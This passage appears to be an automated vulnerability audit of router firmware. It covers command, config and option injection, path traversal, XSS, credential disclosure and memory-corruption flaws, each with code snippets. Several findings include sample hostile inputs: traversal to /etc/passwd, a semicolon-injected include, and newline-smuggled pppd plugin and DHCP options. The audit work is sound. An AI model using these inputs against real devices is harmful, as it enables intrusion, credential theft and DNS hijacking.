- **Description:** In the `get_filter` function, the 'string' field obtained from NVRAM is directly concatenated into the filter string and used to construct the 'server=' configuration line. The lack of input validation and escaping allows attackers to inject newline characters or other special characters to add arbitrary dnsmasq configuration directives (such as 'address=/domain/ip'). Trigger condition: The attacker modifies the 'string' value of the DNS filter in NVRAM (requires enabling). Exploitation method: Inject malicious DNS records or redirect DNS queries, leading to DNS spoofing or cache poisoning. Constraints: The attacker must have permission to modify NVRAM variables (via the web interface or API).
- **Code Snippet:**
  ```
  function get_filter($path)
  {
  	$cnt = query($path."/count");
  	foreach ($path."/entry")
  	{
  		if ($InDeX > $cnt) break;
  		$enable = query("enable");
  		$string = query("string");
  		if ($enable==1 && $string!="") $filter = $filter.$string."/";
  	}
  	if ($filter!="") $filter = "/".$filter;
  	return $filter;
  }
  
  // Used in genconf:
  fwrite(a,$conf, "server=".$filter."local\n");
  ```
- **Keywords:** NVRAM: /runtime/services/dnsprofiles/entry/filter/entry/string, NVRAM: /device/log/mydlink/dnsquery, NVRAM: /mydlink/register_st, File path: /etc/scripts/dns-helper.sh
- **Notes:** Complete attack chain: Input point (NVRAM variable) → Data flow (unfiltered concatenation) → Dangerous operation (writing to dnsmasq configuration). Need to verify if the attacker can modify NVRAM via the web interface; it is recommended to subsequently analyze web interface files (such as CGI scripts) to confirm access control. Related functions: genconf, XNODE_getpathbytarget.

---
### Untitled Finding

- **File/Directory Path:** `sbin/httpd.c`
- **Location:** `httpd.c:16998 sub_16998`
- **Risk Score:** 7.5
- **Confidence:** 8.5
- **Description:** In the function `sub_16998` (path information processing), there is a path traversal vulnerability. Attackers can access arbitrary files on the system by constructing malicious HTTP request paths (such as those containing '../' sequences). This function uses `open64` to open files but does not adequately validate user-input paths. Combined with the HTTP request processing flow, attackers can bypass authentication and read sensitive files (e.g., /etc/passwd). Trigger condition: The attacker sends an HTTP request containing a path traversal sequence (e.g., GET /../../../etc/passwd HTTP/1.1). Exploitation method: Reading system files via path traversal may lead to information disclosure.
- **Code Snippet:**
  ```
  fd = open64(s, 2048);  // s is a user-controlled path, insufficiently validated
  ```
- **Keywords:** PATH_INFO, QUERY_STRING, HTTP request path
- **Notes:** Further validation of the path filtering logic is needed, but the code lacks sufficient sanitization. It is recommended to check if `sub_16CA4` (path sanitization function) is correctly called.

---
### CommandInjection-ipsec_include

- **File/Directory Path:** `usr/lib/ipsec/_include`
- **Location:** `_include:approx_line_50 (in awk script, within the /^include[ \t]+/ block, system call)`
- **Risk Score:** 7.5
- **Confidence:** 8.5
- **Description:** When processing the `include` directive in the awk section of the script, the `newfile` variable is extracted directly from the input file and passed unescaped to the `system("ipsec _include " newfile)` call. This allows command injection: if an attacker can inject shell metacharacters (such as semicolons or backticks) into the configuration file, arbitrary commands can be executed. Trigger conditions include: the attacker controls the configuration file content (by modifying the file or setting the `IPSEC_CONFS` environment variable to point to a malicious configuration), and runs `ipsec _include` or related commands. Exploitation methods include injecting commands like `include /etc/passwd; malicious_command` to execute malicious code, potentially leading to privilege escalation or data leakage. Constraints: the script checks file readability, but this may be bypassed during recursive calls; non-root users need file write permissions or environment control.
- **Code Snippet:**
  ```
  /^include[ \t]+/ {
  	orig = $0
  	sub(/[ \t]+#.*$/, "")
  	if (NF != 2) {
  		msg = "(" FILENAME ", line " lineno ")"
  		msg = msg " include syntax error in \"" orig "\""
  		print "#:" msg
  		exit 1
  	}
  	newfile = $2
  	if (newfile !~ /^\// && FILENAME ~ /\//) {
  		prefix = FILENAME
  		sub("[^/]+$", "", prefix)
  		newfile = prefix newfile
  	}
  	system("ipsec _include " newfile)
  	print ""
  	print "#>", FILENAME, lineno + 1
  	next
  }
  ```
- **Keywords:** IPSEC_CONFS environment variable, include directive in configuration files, ipsec _include command
- **Notes:** The vulnerability relies on the attacker being able to control the input configuration file, possibly through the IPSEC_CONFS environment variable or file modification. It is recommended to verify the script's actual usage scenario in the firmware, such as checking the permissions of the ipsec command and the default locations of configuration files. Subsequent analysis should track the data flow of ipsec-related commands and configuration files.

---
### Command-Injection-NOTIFY.WFAWLANConfig.1.sh

- **File/Directory Path:** `htdocs/upnp/NOTIFY.WFAWLANConfig.1.sh`
- **Location:** `NOTIFY.WFAWLANConfig.1.sh:7-10`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** The script accepts external parameters ($1, $2, $3, $4) and directly uses them to construct the PARAMS variable and xmldbc command, without input validation or escaping. These parameters may come from untrusted UPnP events (such as EVENT_TYPE, EVENT_MAC, EVENT_PAYLOAD, REMOTE_ADDR). An attacker can inject malicious commands through carefully crafted parameters, for example, by including shell metacharacters in EVENT_PAYLOAD, thereby achieving command injection when generating or executing temporary scripts. The script executes the generated shell file in the background (sh $SHFILE &), which allows an attacker to execute arbitrary code on the device. Although the attacker is a non-root user, they may escalate privileges or affect system stability.
- **Code Snippet:**
  ```
  PARAMS="-V TARGET_SERVICE=$SERVICE -V EVENT_TYPE=$1 -V EVENT_MAC=$2 -V EVENT_PAYLOAD=$3 -V REMOTE_ADDR=$4"
  xmldbc -P /etc/scripts/upnp/run.NOTIFY-WFADEV.php -V SERVICE=$SVC -V TARGET_PHP=$PHP > $SHFILE
  sh $SHFILE &
  ```
- **Keywords:** /runtime/upnpmsg, SERVICE, EVENT_TYPE, EVENT_MAC, EVENT_PAYLOAD, REMOTE_ADDR, /etc/scripts/upnp/run.NOTIFY-WFADEV.php, NOTIFY.WFAWLANConfig.1.php
- **Notes:** The completeness of the attack chain depends on how xmldbc and the generated PHP script handle the parameters; it is recommended to further analyze /etc/scripts/upnp/run.NOTIFY-WFADEV.php and NOTIFY.WFAWLANConfig.1.php to verify exploitability. The attacker needs to be able to trigger UPnP events, but as a logged-in user, this may be achievable through network requests.

---
### XSS-FancyBox-DOM-Insertion

- **File/Directory Path:** `htdocs/web/webaccess/fancybox/jquery.fancybox-1.3.4.pack.js`
- **Location:** `jquery.fancybox-1.3.4.pack.js:21 (in function I, case 'html'), jquery.fancybox-1.3.4.pack.js:24 (in AJAX success function), jquery.fancybox-1.3.4.pack.js:27 (in function Q, title handling)`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** The FancyBox plugin contains multiple instances where user-controlled data is inserted into the DOM using jQuery's .html() method without proper sanitization, leading to cross-site scripting (XSS) vulnerabilities. Specifically:
- In the 'html' type case (line 21), e.content is directly passed to m.html(e.content) without encoding, allowing arbitrary HTML/JS execution if e.content is controlled by an attacker.
- In the AJAX handling (line 24), the response data (x) is directly inserted via m.html(x) in the success function, enabling XSS if the AJAX response is malicious.
- In title handling (line 27), the title string (s) is built from user inputs and inserted via n.html(s) without sanitization.
Trigger conditions occur when FancyBox is used with user-provided data in href, title, or AJAX responses. An attacker with valid login credentials can exploit this by injecting malicious scripts into these inputs, leading to code execution in the victim's browser context. Potential attacks include session hijacking, data theft, or further exploitation within the web interface.
- **Code Snippet:**
  ```
  Line 21: case "html": m.html(e.content); F(); break;
  Line 24: m.html(x); F()}}})); break;
  Line 27: n.html(s); appendTo("body").show();
  ```
- **Keywords:** href attributes, title attributes, AJAX endpoint URLs (e.href), e.content parameter, d.title variable
- **Notes:** The vulnerability is based on code evidence from this file, but exploitability depends on how FancyBox is integrated into the web application. Further analysis should verify the actual data flow in the application, such as input sources and how they propagate to FancyBox parameters. Recommended next steps: examine the web interface components that use FancyBox, check for input validation in higher-level code, and test for XSS in a controlled environment.

---
### InfoDisclosure-get_Email.asp

- **File/Directory Path:** `htdocs/mydlink/get_Email.asp`
- **Location:** `get_Email.asp:4 (assignment of $displaypass) and get_Email.asp:26 (conditional output)`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** This file uses the GET parameter `displaypass` to control whether the SMTP password is output in the XML response. When the parameter is set to 1, the password is output in plain text. An attacker, as a logged-in user, can send a crafted request (such as `get_Email.asp?displaypass=1`) to steal credentials. Specific behavior: Within the `<config.smtp_email_pass>` tag, the password is only output when `$displaypass == 1`. Trigger condition: Access the URL and set `displaypass=1`. Constraints: There is no input validation or permission check within this file; permissions might be controlled by included files (e.g., header.php), but the attacker is already logged in and might bypass them. Potential attack: Information disclosure leading to theft of SMTP credentials, which could be used for further attacks such as email abuse. Related code logic: Directly uses `$_GET["displaypass"]` to control output, lacking filtering.
- **Code Snippet:**
  ```
  $displaypass = $_GET["displaypass"];
  // ...
  <config.smtp_email_pass><?if($displaypass==1){echo $smtp_password;}?></config.smtp_email_pass>
  ```
- **Keywords:** displaypass GET parameter, /device/log/email/smtp/password, /htdocs/mydlink/get_Email.asp
- **Notes:** Permission verification might exist in header.php or other included files, but based on the assumption that the attacker is already logged in, the vulnerability might be practically exploitable. It is recommended to further verify access controls and permission checks in included files. Related files: header.php, xnode.php, config.php.

---
### Command-Injection-inet_ipv6.php

- **File/Directory Path:** `etc/services/INET/inet_ipv6.php`
- **Location:** `inet_ipv6.php: Multiple locations, including the get_dns function and inet_ipv6_autodetect function`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** A command injection vulnerability was discovered in 'inet_ipv6.php', due to user-controlled DNS values not being properly escaped when constructing shell commands. An attacker, as a logged-in user, can modify IPv6 DNS settings via the web interface and inject malicious commands (such as using semicolons or backticks). When the IPv6 configuration is applied (e.g., during network restart or service reload), the generated script executes these commands, potentially leading to arbitrary code execution. The vulnerability trigger conditions include: 1) The attacker modifies the DNS settings to a malicious value; 2) The system triggers an IPv6 reconfiguration (e.g., by saving settings via the web interface or through auto-detection). Potential exploitation methods include executing system commands, escalating privileges, or accessing sensitive data.
- **Code Snippet:**
  ```
  // get_dns function concatenates DNS values
  function get_dns($p)
  {
      anchor($p);
      $cnt = query("dns/count")+0;
      foreach ("dns/entry")
      {
          if ($InDeX > $cnt) break;
          if ($dns=="") $dns = $VaLuE;
          else $dns = $dns." ".$VaLuE;
      }
      return $dns;
  }
  
  // DNS values used to build command string (example from inet_ipv6_autodetect)
  ' "DNS='.get_dns($inetp."/ipv6").'"'
  
  // Direct use of DNS value in inet_ipv6_autodetect
  '      if [ '.$pdns.' ]; then\n'.
  '           xmldbc -s '.$v6actinetp.'/ipv6/dns/entry:1 "'.$pdns.'"\n'.
  ```
- **Keywords:** dns/entry, /inet/entry/ipv6/dns/entry:1, /inet/entry/ipv6/dns/entry:2, get_dns function return value
- **Notes:** The vulnerability requires a user to modify DNS settings via the web interface and trigger an IPv6 reconfiguration. It is recommended to check the filtering mechanism for DNS input on the web frontend. Related files include '/etc/scripts/IPV6.INET.php' and '/etc/events/WANV6_AUTOCONF_DETECT.sh'. Subsequent analysis should focus on these scripts to confirm the command execution context and permissions.

---
### Buffer Overflow-ISAKMP-v1

- **File/Directory Path:** `usr/libexec/ipsec/pluto`
- **Location:** `pluto:0x000386d0 sym.process_v1_packet -> pluto:0x00039a94 sym.process_packet_tail -> pluto:0x000b83b8 sym.clone_bytes2 -> memcpy`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** When processing version 1 ISAKMP packets, tainted data (raw packet pointer) propagates through the function call chain to memcpy, lacking boundary checks. An attacker can craft malicious version 1 packets, controlling the pointer or length parameter, leading to stack or heap buffer overflow. Trigger condition: Send a specially crafted version 1 ISAKMP packet to the Pluto daemon (e.g., via UDP port 500). Potential exploitation methods include overwriting the return address to execute arbitrary code, crashing the device causing denial of service, or leaking memory information. Exploitation steps: 1) Attacker sends a malicious packet as an authenticated user; 2) The packet enters the processing flow via sym.process_packet; 3) Tainted data propagates to memcpy in sym.clone_bytes2, triggering the overflow.
- **Code Snippet:**
  ```
  In sym.clone_bytes2 (address 0x000b83b0-0x000b83b8):
  0x000b83b0: ldr r1, [s2]        ; Load tainted pointer (from packet) into r1
  0x000b83b4: ldr r2, [var_1ch]   ; Load tainted length (from packet) into r2
  0x000b83b8: bl sym.memcpy       ; Call memcpy, length and pointer not validated, causing buffer overflow
  ```
- **Keywords:** ISAKMP Packet Structure Pointer, memcpy, UDP Port 500/4500, sym.process_v1_packet, sym.process_packet_tail, sym.clone_bytes2
- **Notes:** The attack chain is complete and verifiable, evidence comes from taint propagation analysis. The attacker needs to control the packet content, but as an authenticated user, they can send malicious packets via scripts or tools. It is recommended to check network isolation and input validation. Associated files may include demux.c or packet.c (inferred from code references).

---
### StackOverflow-_pluto_adns-answer

- **File/Directory Path:** `usr/libexec/ipsec/_pluto_adns`
- **Location:** `_pluto_adns:0x0000c8ac sym.answer`
- **Risk Score:** 7.5
- **Confidence:** 7.0
- **Description:** In the answer function of the '_pluto_adns' file, a stack buffer overflow vulnerability was discovered. This function uses read_pipe to read data from a pipe and validates a length field (located at the beginning of the data). The length field must be between 0x18 and 0x1418 bytes, but the stack buffer size is only 0x1400 bytes. If an attacker provides malicious data with a length field between 0x1401 and 0x1418, read_pipe will read more data than the buffer can hold, causing a stack overflow. The overflow could overwrite the return address, allowing arbitrary code execution. Trigger condition: The attacker must be able to send malicious data to the pipe (for example, by manipulating DNS responses or affecting worker processes). Exploitation method: Construct a malicious length field and shellcode to control program flow. The vulnerability involves a lack of strict boundary checks.
- **Code Snippet:**
  ```
  In the answer function:
  0x0000c854      10482de9       push {r4, fp, lr}
  0x0000c858      08b08de2       add fp, var_8h
  0x0000c85c      05db4de2       sub sp, sp, 0x1400  ; Allocate stack buffer (0x1400 bytes)
  ...
  0x0000c8a0      0310a0e1       mov r1, r3          ; Buffer address
  0x0000c8a4      1820a0e3       mov r2, 0x18        ; var_28h = 0x18
  0x0000c8a8      183401e3       movw r3, 0x1418     ; var_2ch = 0x1418
  0x0000c8ac      04fdffeb       bl sym.read_pipe    ; Call read_pipe
  
  In the read_pipe function:
  0x0000bcf8      24201be5       ldr r2, [var_24h]   ; Buffer address
  ...
  0x0000bda0      10301be5       ldr r3, [var_10h]   ; Number of bytes read
  0x0000bda4      030053e3       cmp r3, 3           ; Check if enough to read length field
  0x0000bda8      1d00009a       bls 0xbe24          ; If not enough, continue reading
  0x0000bdac      24301be5       ldr r3, [var_24h]   
  0x0000bdb0      003093e5       ldr r3, [r3]        ; Load length field
  0x0000bdb4      14300be5       str r3, [buf]       ; Store length
  0x0000bdbc      28301be5       ldr r3, [var_28h]   ; Minimum length (0x18)
  0x0000bdc0      030052e1       cmp r2, r3          ; Compare length field and minimum length
  0x0000bdc4      0300003a       blo 0xbdd8          ; If less, jump
  0x0000bdc8      2c201be5       ldr r2, [var_2ch]   ; Maximum length (0x1418)
  0x0000bdcc      14301be5       ldr r3, [buf]       ; Length field
  0x0000bdd0      030052e1       cmp r2, r3          ; Compare length field and maximum length
  0x0000bdd4      1200002a       bhs 0xbe24          ; If less than or equal, continue
  ...
  ; Loop to read data until the number of bytes specified by the length field is read
  ```
- **Keywords:** obj.wi, obj.free_queries, obj.oldest_query, obj.newest_query, reloc.eof_from_pluto
- **Notes:** The vulnerability exists as a stack buffer overflow in the answer function, but the complete attack chain requires verification of whether the attacker can control the pipe input. Worker processes (sym.worker) may receive data from the network (such as DNS responses), so an attacker might trigger the vulnerability through malicious network traffic. It is recommended to further analyze the worker function and pipe communication mechanism to confirm exploitability. Additionally, the program may check for a magic byte (0x646e7304) after the overflow, but the overflow might bypass these checks. No other input points (such as command-line arguments or environment variables) were found to have similar vulnerabilities.

---
### DNS-Injection-opendns

- **File/Directory Path:** `etc/services/DNS/dnscfg.php`
- **Location:** `Main logic section of dnscfg.php (OpenDNS configuration block)`
- **Risk Score:** 7.0
- **Confidence:** 8.0
- **Description:** In the OpenDNS configuration section, the server address is directly obtained from NVRAM and written to the configuration file, lacking validation. Attackers can inject malicious server addresses or configuration commands by modifying 'open_dns' related variables (such as 'adv_dns_srv/dns1'). Trigger condition: Attacker modifies the OpenDNS settings of the WAN-1 interface. Exploitation method: Redirect all DNS queries to an attacker-controlled server, achieving a man-in-the-middle attack. Constraint: The OpenDNS type must be set to 'advance', 'family', or 'parent'.
- **Code Snippet:**
  ```
  if($opendns_type == "advance")
  {
  	fwrite("a", $CONF, "server=".query($wan1_infp."/open_dns/adv_dns_srv/dns1")."\n");
  	fwrite("a", $CONF, "server=".query($wan1_infp."/open_dns/adv_dns_srv/dns2")."\n");
  }
  ```
- **Keywords:** NVRAM: /inf/WAN-1/open_dns/type, NVRAM: /inf/WAN-1/open_dns/adv_dns_srv/dns1, NVRAM: /inf/WAN-1/open_dns/family_dns_srv/dns1, NVRAM: /inf/WAN-1/open_dns/parent_dns_srv/dns1
- **Notes:** The exploit chain is similar to the first discovery, but depends on the OpenDNS feature being enabled. Evidence comes from direct code writing; it is recommended to check the access control of the NVRAM settings interface.

---
### Untitled Finding

- **File/Directory Path:** `sbin/httpd.c`
- **Location:** `httpd.c:17F74 sub_17F74`
- **Risk Score:** 7.0
- **Confidence:** 7.5
- **Description:** In the function `sub_17F74` (path conversion), there is a buffer overflow risk. Using `sprintf` to concatenate user-controlled paths may cause an overflow. An attacker can provide an overly long path, overflowing the target buffer. Trigger condition: malicious path in an HTTP request. Exploitation method: overflow may lead to code execution.
- **Code Snippet:**
  ```
  sprintf(v10, "%s/%.*s", v12->pw_dir, -2 - v15 + a5, **(_DWORD **)(i + 24));
  ```
- **Keywords:** PATH_INFO, sprintf
- **Notes:** Buffer size a5 may be insufficient, it is recommended to use snprintf.

---
### XSS-show_media_list

- **File/Directory Path:** `htdocs/web/webaccess/doc.php`
- **Location:** `doc.php (show_media_list function)`
- **Risk Score:** 6.5
- **Confidence:** 7.0
- **Description:** In the show_media_list function of 'doc.php', the file name (obj.name) from the server response is directly inserted into HTML using innerHTML without escaping. This allows cross-site scripting (XSS) if the file name contains malicious JavaScript code. Trigger condition: When a user visits the doc.php page, if the file name returned by the server contains malicious script, it will be executed in the user's browser. Constraints: The attacker needs to be able to control the file name (e.g., via file upload or metadata modification), and the victim must view the document list. Potential attack: A logged-in user uploads a file with a malicious file name; when other users view the list, script execution may lead to session theft, redirection, or other malicious actions. Code logic shows obj.name is used for the title attribute and div content, without filtering or encoding.
- **Code Snippet:**
  ```
  str += "<tr onMouseOver=\"this.style.background='#D8D8D8'\" onMouseOut=\"this.style.background=''\">"
   + "<td width=\"36\" height=\"36\" class=\"tdbg\">"
   + "<img src=\"webfile_images/icon_files.png\" width=\"36\" height=\"36\" border=\"0\">"
   + "</td>"
   + "<td width=\"868\" class=\"text_2\">"
   + "<a  href=\""+req+"\" title=\"" + obj.name + "\">"
   + "<div>"
   + file_name+ "<br>" + get_file_size(obj.size) + ", " + obj.mtime
   + "</div>"
   + "</a>"
   + "</td></tr>";
  media_list.innerHTML = str;
  ```
- **Keywords:** ListCategory API, GetFile API, localStorage.language
- **Notes:** The vulnerability is evident in the client-side code, but the full exploitation chain requires the server-side to allow malicious file names (e.g., via file upload functionality). It is recommended to further analyze server-side components (such as file upload handling) to verify exploitability. Related files may include CGI scripts or API endpoints that handle the file list.

---
### Command-Injection-pppoptions

- **File/Directory Path:** `etc/services/INET/inet_ppp6.php`
- **Location:** `inet_ppp6.php: pppoptions function and subsequent script generation section, specifically at the $optfile definition and fwrite to $dialupsh`
- **Risk Score:** 6.5
- **Confidence:** 6.0
- **Description:** Potential command injection vulnerability, originating from the use of unfiltered INET_INFNAME variable in shell script generation. If an attacker can control INET_INFNAME (e.g., via web interface or environment variables), arbitrary commands can be injected. Specific trigger condition: when the PPP connection starts, the generated dial-up script (e.g., /var/run/ppp-*-dialup.sh) executes the 'pppd file $optfile' command, where $optfile is constructed from '/etc/ppp/options.'.$inf. If $inf (i.e., INET_INFNAME) contains a semicolon or command substitution characters (e.g., '; evil_command'), it will cause evil_command to execute with high privileges (possibly root). Constraints: requires the attacker to be able to control the INET_INFNAME value, and the script must run in a privileged context. Potential exploitation method: inject malicious commands by modifying interface configuration parameters to achieve privilege escalation or arbitrary code execution.
- **Code Snippet:**
  ```
  $optfile = "/etc/ppp/options.".$inf;
  fwrite(a, $dialupsh, 'pppd file '.$optfile.' > /dev/console\n');
  ```
- **Keywords:** INET_INFNAME global variable
- **Notes:** Need to verify if INET_INFNAME comes from untrusted input (e.g., web requests or user configuration). It is recommended to analyze the context calling this script (e.g., web interface or other components) to confirm input controllability. Associated files may include library files in /htdocs/phplib/.

---
### XSS-file_list_display

- **File/Directory Path:** `htdocs/web/webaccess/folder_view.php`
- **Location:** `folder_view.php (JavaScript functions: show_folder_content and get_sub_tree)`
- **Risk Score:** 6.0
- **Confidence:** 8.5
- **Description:** A Cross-Site Scripting (XSS) vulnerability exists in the file list display function. An attacker (logged-in user) uploads a file containing a malicious script in the filename (e.g., the filename contains `<script>alert('XSS')</script>`) via /dws/api/UploadFile. The backend returns data via /dws/api/ListFile, and the frontend directly uses innerHTML or string concatenation to render the filename in the show_folder_content and get_sub_tree functions without escaping user input. This causes the script to execute when the victim views the file list. Complete attack chain: Input point (file upload API) → Data flow (backend returns unfiltered data) → Dangerous operation (frontend renders without escaping). Trigger condition: Attacker uploads a malicious file, victim views the list. High exploitability, may lead to session theft or malicious redirection.
- **Code Snippet:**
  ```
  In the show_folder_content function:
  cell_html = "<input type=\"checkbox\" id=\"" + i + "\" name=\"" + file_name + "\" value=\"1\"/>"
  + "<a  href=\""+req+"\" title=\"" + obj.name + "\">"
  + "<div style=\"width:665px;overflow:hidden\">"
  + file_name + "<br>" + get_file_size(obj.size) + ", " + time
  + "</div></a>";
  
  In the get_sub_tree function:
  my_tree += "<li id=\"" + obj_path + "\" class=\"tocollapse\">"
  + "<a href=\"#\" onClick=\"click_folder('" + obj_path + "', '" + current_volid + "', '" +obj.mode+ "')\">"
  + obj.name + "</a></li>"
  + "<li></li>"
  + "<li><span id=\"" + obj_path + "-sub\"></span></li>";
  ```
- **Keywords:** file_name, obj.name, show_folder_content, get_sub_tree, /dws/api/UploadFile, /dws/api/ListFile
- **Notes:** The severity of the vulnerability depends on whether the backend filters or escapes the filename. The frontend code clearly shows unescaped output, so if the backend returns unprocessed filenames, the XSS is exploitable. The risk is higher in shared file environments. It is recommended to further analyze the backend CGI endpoints (such as /dws/api/UploadFile and /dws/api/ListFile) to confirm the data flow and validation mechanisms. Check if there are other user input points (such as path parameters) that could be abused.

---
### Option-Injection-pppoptions

- **File/Directory Path:** `etc/services/INET/inet_ppp6.php`
- **Location:** `inet_ppp6.php: Write locations for acname and service in the pppoptions function`
- **Risk Score:** 5.5
- **Confidence:** 5.0
- **Description:** Potential pppd option injection vulnerability, originating from the use of unfiltered PPPoE parameters (acname and servicename) in option file generation. If an attacker can control these parameters (such as through the configuration interface), they can inject additional pppd options. Specific trigger condition: when pppd reads the option file (e.g., /etc/ppp/options.*), if acname or service contains newline characters and malicious options (e.g., 'valid\nplugin /tmp/evil.so'), it may load malicious plugins or execute commands. Constraints: requires the pppd parser to treat newline characters within quotes as option separators, and the input must be controllable. Potential exploitation method: by modifying PPPoE settings to inject plugin paths or other options, leading to arbitrary code execution.
- **Code Snippet:**
  ```
  if($acname!="")   fwrite("a",$optfile, 'pppoe_ac_name "'.$acname.'"\n');
  if($service!="")  fwrite("a",$optfile, 'pppoe_srv_name "'.$service.'"\n');
  ```
- **Keywords:** NVRAM variable pppoe/acname, NVRAM variable pppoe/servicename
- **Notes:** Need to verify whether pppd allows option injection via newline characters and confirm if the input source for acname/service is controllable. It is recommended to test pppd parsing behavior and check the configuration interface. Associated components include the pppd binary file and configuration management tools.

---
### DoS-_ctf_cfg_req_process

- **File/Directory Path:** `lib/modules/ctf.ko`
- **Location:** `ctf.ko:0x08000fd0 sym._ctf_cfg_req_process`
- **Risk Score:** 5.0
- **Confidence:** 8.0
- **Description:** In the function `_ctf_cfg_req_process`, when processing configuration requests, if the internal check function (fcn.08000d88) returns 0, the code executes a branch where the format string pointer for `sprintf` is loaded from address 0, causing a null pointer dereference and kernel panic. An attacker as a non-root user (with valid login credentials) can trigger this condition by sending a specially crafted configuration request (e.g., via netlink socket or IPC mechanism), resulting in a denial of service. The vulnerability trigger condition depends on input that causes fcn.08000d88 to return 0, but the code lacks sufficient validation of input data, allowing an attacker to reliably trigger the vulnerability by constructing a malicious request.
- **Code Snippet:**
  ```
  0x08000fc0      0330a0e3       mov r3, 3
  0x08000fc4      0600a0e1       mov r0, r6                  ; int32_t arg1
  0x08000fc8      043084e5       str r3, [r4, 4]
  0x08000fcc      7c109fe5       ldr r1, [0x08001050]        ; [0x8001050:4]=0 ; int32_t arg2
  0x08000fd0      feffffeb       bl sprintf                  ; RELOC 24 sprintf
  ```
- **Keywords:** netlink_socket, IPC_config_request
- **Notes:** This vulnerability leads to denial of service, not privilege escalation. Further verification is needed to determine if non-root users can access the configuration request mechanism via netlink or other interfaces. It is recommended to check the module's initialization code (such as sym.ctf_kattach) to confirm how the entry point is registered. Additionally, the details of function fcn.08000d88 are not fully analyzed and may involve additional validation logic.

---
### DHCP-Config-Injection-dhcps4start

- **File/Directory Path:** `etc/services/DHCPS/dhcpserver.php`
- **Location:** `dhcpserver.php: around line 150-160 function dhcps4start`
- **Risk Score:** 5.0
- **Confidence:** 6.0
- **Description:** In the 'dhcpserver.php' file, a potential configuration injection vulnerability was discovered. An attacker can inject additional configuration options into the DHCP server configuration file by modifying the hostname field of a static lease. Specifically, in the dhcps4start function, the hostname is obtained via get("s", "hostname") and directly concatenated and written to the configuration file ($udhcpd_conf), lacking input validation and escaping. If the hostname contains newline characters, an attacker can add arbitrary udhcpd configuration options, such as redirecting DNS or setting a malicious router. Trigger condition: The attacker possesses valid login credentials (non-root user) and can modify DHCP static lease settings (e.g., via the management interface). Exploitation method: Modify the hostname to a malicious string (e.g., 'malicious\nopt dns 8.8.8.8'), causing the configuration file to include additional lines, affecting DHCP client behavior. Constraints: Special characters are not filtered before the hostname is written to the configuration file; the attacker must have access to the DHCP configuration modification function.
- **Code Snippet:**
  ```
  $hostname = get("s", "hostname");
  if($hostname == "") {
      $hostname = "(unknown)";
  } else {
      $hostname = $hostname;
  }
  ...
  fwrite("a",$udhcpd_conf, "static ".$hostname." ".$ipaddr." ".$macaddr."\n");
  ```
- **Keywords:** staticleases/entry/hostname, /var/servd/*-udhcpd.conf, xmldbc
- **Notes:** Risk score is relatively low because the vulnerability may lead to configuration tampering rather than direct code execution. It is necessary to verify whether the attacker can modify static lease settings via the management interface. It is recommended to check if the udhcpd configuration parser has strict validation for input. Related files: May involve scripts handling DHCP settings via the web interface or API. Subsequent analysis direction: Check the access control mechanisms of input sources (such as NVRAM or web forms).

---
### Untitled Finding

- **File/Directory Path:** `etc/services/INET/interface.php`
- **Location:** `interface.php: ifinetsetup function`
- **Risk Score:** 5.0
- **Confidence:** 4.0
- **Description:** In multiple functions, unfiltered input parameters (such as $name, $ifname, $cmd) are used to construct shell command strings and are written via fwrite into scripts that may be subsequently executed. If an attacker can control these parameters (for example, by setting the interface name or schedule via the Web interface), malicious commands may be injected. Specific trigger conditions include: when the interface setup function is called, parameters are directly concatenated into the command string; lack of input validation and boundary checking; potential exploitation methods include executing arbitrary commands by injecting semicolons or newline characters. The related code logic involves string concatenation and command writing.
- **Code Snippet:**
  ```
  fwrite(a, $_GLOBALS["START"], 'service INF.'.$name.' '.$cmd.'\n');
  fwrite(a, $_GLOBALS["STOP"], 'service INF.'.$name.' stop\n');
  ```
- **Keywords:** $name, $ifname, $cmd, $_GLOBALS["START"], $_GLOBALS["STOP"], service INF., service IPT., service CHKCONN.
- **Notes:** Further verification is needed for the source of input parameters $name and $cmd, for example by analyzing the Web interface or IPC mechanism that calls interface.php. It is recommended to check relevant configuration files or user input points to confirm the completeness of the attack chain.

---
### Untitled Finding

- **File/Directory Path:** `etc/services/INET/interface.php`
- **Location:** `interface.php: srviptsetupall function`
- **Risk Score:** 5.0
- **Confidence:** 4.0
- **Description:** In the srviptsetupall function, the $ifname parameter is directly used to construct service start/stop commands, lacking input filtering. If $ifname is user-controllable, an attacker may perform arbitrary operations through command injection. Trigger conditions include when this function is called and parameters are concatenated into command strings; exploitation methods are similar to other command injection points. The code logic involves looping to construct commands and writing them.
- **Code Snippet:**
  ```
  fwrite("a",$_GLOBALS["START"], "service IPT.".$ifname." start\n");
  fwrite("a",$_GLOBALS["STOP"], "service IPT.".$ifname." stop\n");
  ```
- **Keywords:** $ifname, $_GLOBALS["START"], $_GLOBALS["STOP"], service IPT., service IP6T.
- **Notes:** The parameter $ifname may come from user configuration, but additional evidence is needed to confirm its controllability. It is recommended to trace the data flow to the user input point.

---
### Untitled Finding

- **File/Directory Path:** `etc/services/INET/interface.php`
- **Location:** `interface.php: chkconnsetupall function`
- **Risk Score:** 5.0
- **Confidence:** 4.0
- **Description:** In the chkconnsetupall function, the $ifname and $cmd parameters are used to construct the connection check service command, with no visible input validation. An attacker may inject commands by controlling the interface name or schedule settings. The trigger condition includes the function being called with maliciously constructed parameters; the exploitation method involves command string injection. The code logic includes schedule setting queries and command writing.
- **Code Snippet:**
  ```
  fwrite("a", $_GLOBALS["START"], 'service CHKCONN.'.$ifname.' '.$cmd.'\n');
  fwrite("a", $_GLOBALS["STOP"], 'service CHKCONN.'.$ifname.' stop\n');
  ```
- **Keywords:** $ifname, $cmd, $_GLOBALS["START"], $_GLOBALS["STOP"], service CHKCONN.
- **Notes:** $cmd originates from schedule settings (such as $days, $start, $end), which may be controllable via the user interface. It is necessary to analyze the data flow from user input to these parameters.

---
